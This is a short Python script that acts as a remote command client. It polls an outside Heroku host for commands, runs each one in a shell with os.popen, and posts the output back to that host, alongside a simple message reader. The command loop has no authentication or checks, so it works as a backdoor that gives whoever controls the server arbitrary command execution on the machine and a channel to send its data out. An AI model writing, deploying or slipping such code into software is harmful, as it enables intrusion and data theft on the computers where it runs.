import requests
from threading import Thread
import os

endpoint_2 = 'http://127.0.0.1:8000/'
endpoint_1 = 'https://xremote.herokuapp.com/'


def receiver():
    while True:
        message = requests.get(f'{endpoint_1}reader')
        message = dict(message.json())

        if message['new']:
            sender = message['sender']
            message = message['message']['message']
            print(f'Anon-uit command line [Version 0.0.1]/{sender}: {message}')



def commands():
    while True:
        command = requests.get(f'{endpoint_1}read_command')
        command = dict(command.json())

        if command['new']:
            sender = command['sender']
            command = command['command']['command']
            print(f'Anon-uit command line [Version 0.0.1]/{sender}: {command}')
            print(f'executing {command}..')
            cmm = os.popen(command)
            cmm = cmm.read()
            print(type(cmm))
            print('COMMAND RESULT: ', cmm, 'END RESULT')
            content = {'response': cmm}
            sender = requests.post(f'{endpoint_1}command_feedback', json=content)
            print(sender)


def scripts():
    while True:
        message = requests.get(f'{endpoint_1}reader')
        message = dict(message.json())

        if message['new']:
            sender = message['sender']
            message = message['message']['message']
            print(f'Anon-uit command line [Version 0.0.1]/{sender}: {message}')


print('Anon-uit command line [Version 0.0.1]/Starting listerner...')
t1 = Thread(target=commands)
t2 = Thread(target=receiver)
t1.start()
t2.start()
